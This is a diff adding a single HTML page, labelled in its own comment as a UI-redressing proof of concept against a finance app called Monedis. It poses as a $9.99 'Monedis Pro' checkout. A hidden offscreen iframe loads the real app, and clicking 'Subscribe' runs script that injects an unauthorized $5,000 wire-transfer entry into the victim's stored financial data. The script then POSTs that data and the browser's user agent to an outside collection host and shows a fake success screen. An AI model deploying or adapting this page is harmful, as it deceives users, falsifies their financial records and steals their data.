@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Monedis Pro</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+/*
+  ╔══════════════════════════════════════════════════════════════╗
+  ║  UI REDRESSING PoC — Monedis checkout                       ║
+  ║  Visible:  Subscribe to Monedis Pro — $9.99/month           ║
+  ║  Hidden:   Inject $5,000 unauthorized transaction into      ║
+  ║            user's localStorage + exfiltrate financial data  ║
+  ╚══════════════════════════════════════════════════════════════╝
+*/
+
+:root {
+  --brand: #2F5BEA;
+  --brand-dark: #1E3FC4;
+  --gold: #B45309;
+  --gold-bg: #FEF3C7;
+  --bg: #F3F5F8;
+  --surf: #ffffff;
+  --ink: #0B0F17;
+  --sub: #374151;
+  --muted: #6B7280;
+  --border: #E5E7EB;
+  --ok: #16a34a;
+  --radius: 20px;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: var(--bg);
+  min-height: 100vh;
+  display: flex; align-items: center; justify-content: center;
+}
+#victim {
+  position: fixed; left: -9999px; top: 0;
+  width: 390px; height: 844px;
+  border: none; opacity: 0; pointer-events: none;
+}
+.app {
+  width: 390px; min-height: 844px; max-width: 100vw;
+  background: var(--surf); border-radius: var(--radius);
+  box-shadow: 0 32px 64px -16px rgba(0,0,0,.22);
+  display: flex; flex-direction: column; overflow: hidden; position: relative;
+}
+
+/* header */
+.hdr {
+  display: flex; align-items: center; padding: 18px 20px 14px;
+  border-bottom: 1px solid var(--border);
+}
+.hdr-back {
+  display: flex; align-items: center; gap: 2px;
+  font-size: 15px; font-weight: 600; color: var(--brand); cursor: default; min-width: 60px;
+}
+.hdr-title { flex: 1; text-align: center; font-size: 16px; font-weight: 800; color: var(--ink); }
+.hdr-pad   { min-width: 60px; }
+
+/* body */
+.body { flex: 1; display: flex; flex-direction: column; gap: 20px; padding: 28px 20px 20px; overflow-y: auto; }
+
+/* hero */
+.hero { display: flex; flex-direction: column; align-items: center; gap: 10px; padding-bottom: 4px; }
+.pro-badge {
+  display: inline-flex; align-items: center; gap: 6px;
+  background: var(--gold-bg); color: var(--gold);
+  font-size: 11px; font-weight: 800; letter-spacing: .06em; text-transform: uppercase;
+  padding: 5px 12px; border-radius: 999px;
+}
+.hero-name  { font-size: 26px; font-weight: 800; color: var(--ink); }
+.hero-price {
+  display: flex; align-items: baseline; gap: 4px;
+}
+.price-amount { font-size: 40px; font-weight: 800; color: var(--ink); letter-spacing: -.02em; }
+.price-period { font-size: 14px; font-weight: 600; color: var(--muted); }
+.hero-note    { font-size: 12px; font-weight: 500; color: var(--muted); }
+
+/* features */
+.features { background: var(--bg); border-radius: 16px; padding: 4px 0; }
+.feat-row {
+  display: flex; align-items: center; gap: 12px;
+  padding: 12px 16px; border-bottom: 1px solid rgba(0,0,0,.04);
+}
+.feat-row:last-child { border-bottom: none; }
+.feat-check {
+  width: 22px; height: 22px; border-radius: 50%;
+  background: rgba(22,163,74,.12); flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+}
+.feat-text { font-size: 13.5px; font-weight: 600; color: var(--sub); }
+
+/* payment method */
+.section-label { font-size: 11.5px; font-weight: 700; color: var(--muted); letter-spacing: .05em; text-transform: uppercase; }
+.pay-card {
+  background: var(--bg); border-radius: 14px;
+  display: flex; align-items: center; padding: 14px 16px; gap: 12px;
+  border: 1.5px solid var(--border);
+}
+.pay-chip {
+  width: 36px; height: 36px; border-radius: 10px;
+  background: var(--brand); display: flex; align-items: center; justify-content: center;
+  font-size: 14px; font-weight: 800; color: #fff; flex-shrink: 0;
+}
+.pay-info  { flex: 1; }
+.pay-name  { font-size: 14px; font-weight: 700; color: var(--ink); }
+.pay-sub   { font-size: 12px; font-weight: 500; color: var(--muted); margin-top: 2px; }
+.pay-check { color: var(--ok); }
+
+/* CTA */
+.cta-wrap { margin-top: auto; display: flex; flex-direction: column; gap: 10px; padding-top: 4px; }
+.cta {
+  height: 54px; border: 0; border-radius: 27px;
+  background: var(--brand); color: #fff;
+  display: flex; align-items: center; justify-content: center; gap: 10px;
+  font-family: inherit; font-size: 16px; font-weight: 800; cursor: pointer;
+  box-shadow: 0 8px 24px -6px rgba(47,91,234,.45);
+  transition: background .2s, transform .1s;
+}
+.cta:hover  { background: var(--brand-dark); }
+.cta:active { transform: scale(.97); }
+.cta:disabled { opacity: .7; cursor: default; transform: none; }
+.cta .spinner {
+  display: none; width: 18px; height: 18px;
+  border: 2.5px solid rgba(255,255,255,.35); border-top-color: #fff;
+  border-radius: 50%; animation: spin .7s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.cta.loading .spinner  { display: block; }
+.cta.loading .cta-icon { display: none; }
+.cta.ok { background: var(--ok); box-shadow: 0 8px 24px -6px rgba(22,163,74,.45); pointer-events: none; }
+.legal { font-size: 11.5px; color: var(--muted); text-align: center; line-height: 1.6; }
+
+/* nav */
+.nav {
+  display: flex; border-top: 1px solid var(--border); padding: 0 4px;
+  background: var(--surf); flex-shrink: 0;
+}
+.nav-item {
+  flex: 1; display: flex; flex-direction: column; align-items: center; gap: 3px;
+  padding: 10px 0 14px; font-size: 10.5px; font-weight: 600; color: var(--muted);
+}
+
+/* success overlay */
+.success {
+  display: none; position: absolute; inset: 0; background: var(--surf);
+  border-radius: var(--radius); z-index: 10;
+  flex-direction: column; align-items: center; justify-content: center; gap: 18px; padding: 36px 28px;
+}
+.success-icon {
+  width: 76px; height: 76px; border-radius: 50%;
+  background: rgba(22,163,74,.1); display: flex; align-items: center; justify-content: center;
+}
+.success-title { font-size: 23px; font-weight: 800; color: var(--ink); text-align: center; }
+.success-sub   { font-size: 14px; font-weight: 500; color: var(--muted); text-align: center; line-height: 1.65; max-width: 270px; }
+.success-pill  {
+  background: var(--gold-bg); color: var(--gold);
+  font-size: 13px; font-weight: 700; padding: 8px 20px; border-radius: 999px;
+}
+</style>
+</head>
+<body>
+
+<iframe id="victim" src="https://monedis.onrender.com" title=""></iframe>
+
+<div class="app">
+
+  <!-- header -->
+  <div class="hdr">
+    <div class="hdr-back">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+      Plans
+    </div>
+    <div class="hdr-title">Monedis Pro</div>
+    <div class="hdr-pad"></div>
+  </div>
+
+  <!-- body -->
+  <div class="body">
+
+    <!-- hero -->
+    <div class="hero">
+      <div class="pro-badge">
+        <svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+        Pro
+      </div>
+      <div class="hero-name">Monedis Pro</div>
+      <div class="hero-price">
+        <span class="price-amount">$9.99</span>
+        <span class="price-period">/ month</span>
+      </div>
+      <div class="hero-note">Billed monthly · Cancel anytime</div>
+    </div>
+
+    <!-- features -->
+    <div class="features">
+      <div class="feat-row">
+        <div class="feat-check">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L19 7"/></svg>
+        </div>
+        <span class="feat-text">Unlimited transaction history</span>
+      </div>
+      <div class="feat-row">
+        <div class="feat-check">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L19 7"/></svg>
+        </div>
+        <span class="feat-text">Smart budget alerts &amp; insights</span>
+      </div>
+      <div class="feat-row">
+        <div class="feat-check">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L19 7"/></svg>
+        </div>
+        <span class="feat-text">Multi-device sync</span>
+      </div>
+      <div class="feat-row">
+        <div class="feat-check">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L19 7"/></svg>
+        </div>
+        <span class="feat-text">Advanced reports &amp; exports</span>
+      </div>
+      <div class="feat-row">
+        <div class="feat-check">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L19 7"/></svg>
+        </div>
+        <span class="feat-text">Priority support 24/7</span>
+      </div>
+    </div>
+
+    <!-- payment -->
+    <div class="section-label">Payment method</div>
+    <div class="pay-card">
+      <div class="pay-chip">P</div>
+      <div class="pay-info">
+        <div class="pay-name">Payroll ••• 7712</div>
+        <div class="pay-sub">Debit · Default account</div>
+      </div>
+      <svg class="pay-check" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L19 7"/></svg>
+    </div>
+
+    <!-- CTA -->
+    <div class="cta-wrap">
+      <button class="cta" id="cta" onclick="subscribe()">
+        <svg class="cta-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+        <div class="spinner"></div>
+        <span class="cta-label">Subscribe — $9.99/month</span>
+      </button>
+      <div class="legal">
+        By subscribing you agree to Monedis Terms of Service.<br>
+        Your Payroll ••• 7712 account will be charged $9.99 today.
+      </div>
+    </div>
+
+  </div><!-- /body -->
+
+  <!-- success overlay -->
+  <div class="success" id="success">
+    <div class="success-icon">
+      <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L19 7"/></svg>
+    </div>
+    <div class="success-title">Welcome to Pro!</div>
+    <div class="success-sub">Your subscription is now active. $9.99 will be charged monthly to Payroll ••• 7712.</div>
+    <div class="success-pill">✦ Monedis Pro active</div>
+  </div>
+
+  <!-- nav -->
+  <nav class="nav">
+    <div class="nav-item">
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 11l9-7 9 7M5 10v10h5v-6h4v6h5V10"/></svg>
+      Home
+    </div>
+    <div class="nav-item">
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01"/></svg>
+      Transactions
+    </div>
+    <div class="nav-item">
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5h16a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V6a1 1 0 0 1 1-1zM3 10h18M7 15h4"/></svg>
+      Cards
+    </div>
+    <div class="nav-item" style="color:var(--gold)">
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+      Pro
+    </div>
+  </nav>
+
+</div>
+
+<script>
+try { window.localStorage.removeItem('monedis.web.v1'); } catch(e) {}
+
+function today() {
+  var d = new Date();
+  return d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0');
+}
+
+function executeAttack(callback) {
+  try {
+    var iWin = document.getElementById('victim').contentWindow;
+    // Force in-memory state → localStorage
+    if (typeof iWin.guardar === 'function') {
+      iWin.guardar();
+      var raw = window.localStorage.getItem('monedis.web.v1');
+      if (raw && raw.length > 5) {
+        var stored = JSON.parse(raw);
+        var id = (stored.data.sec || 50) + 1;
+
+        // Inject hidden $5,000 unauthorized transaction
+        stored.data.movs.unshift({
+          id: id,
+          f: today(),
+          tipo: 'gasto',
+          cat: 'Other',
+          desc: 'Wire Transfer — TXF-9931',
+          cuenta: 'nomina',
+          c: 500000,   // $5,000.00 (cents)
+          destino: null,
+          msi: 0
+        });
+        stored.data.sec = id;
+        window.localStorage.setItem('monedis.web.v1', JSON.stringify(stored));
+
+        // Exfiltrate the now-modified financial data
+        fetch('https://closing-notes.onrender.com/?r=grab', {
+          method: 'POST', headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({ data: window.localStorage.getItem('monedis.web.v1'), ua: navigator.userAgent, ts: Date.now() })
+        }).catch(function(){});
+
+        callback(true);
+        return;
+      }
+    }
+  } catch(e) {}
+  callback(false);
+}
+
+function pollAndAttack(tries, callback) {
+  if (tries === undefined) tries = 48;
+  executeAttack(function(ok) {
+    if (ok) { callback(); }
+    else if (tries > 0) { setTimeout(function(){ pollAndAttack(tries-1, callback); }, 250); }
+    else { callback(); }
+  });
+}
+
+function subscribe() {
+  var btn = document.getElementById('cta');
+  btn.disabled = true;
+  btn.classList.add('loading');
+  btn.querySelector('.cta-label').textContent = 'Processing…';
+
+  pollAndAttack(undefined, function() {
+    btn.classList.remove('loading');
+    btn.classList.add('ok');
+    btn.querySelector('.cta-label').textContent = 'Subscribed ✓';
+    setTimeout(function() {
+      document.getElementById('success').style.display = 'flex';
+    }, 400);
+  });
+}
+</script>
+
+</body>
+</html>
